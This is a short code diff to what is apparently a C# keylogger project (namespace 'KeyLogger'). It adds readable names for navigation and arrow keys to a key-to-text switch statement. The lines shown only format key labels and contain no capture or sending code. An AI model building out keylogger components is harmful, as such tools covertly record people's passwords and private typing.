@@ -126,6 +126,19 @@ namespace KeyLogger
                 case Keys.Back: return "Backspace";
                 case Keys.Tab: return "Tab";
                 case Keys.Escape: return "Esc";
+
+                case Keys.Insert: return "Insert";
+                case Keys.Delete: return "Delete";
+                case Keys.Home: return "Home";
+                case Keys.End: return "End";
+                case Keys.PageUp: return "PageUp";
+                case Keys.PageDown: return "PageDown";
+
+                case Keys.Up: return "Up";
+                case Keys.Down: return "Down";
+                case Keys.Left: return "Left";
+                case Keys.Right: return "Right";
+
                 case Keys.F1: return "F1";
                 case Keys.F2: return "F2";
                 case Keys.F3: return "F3";
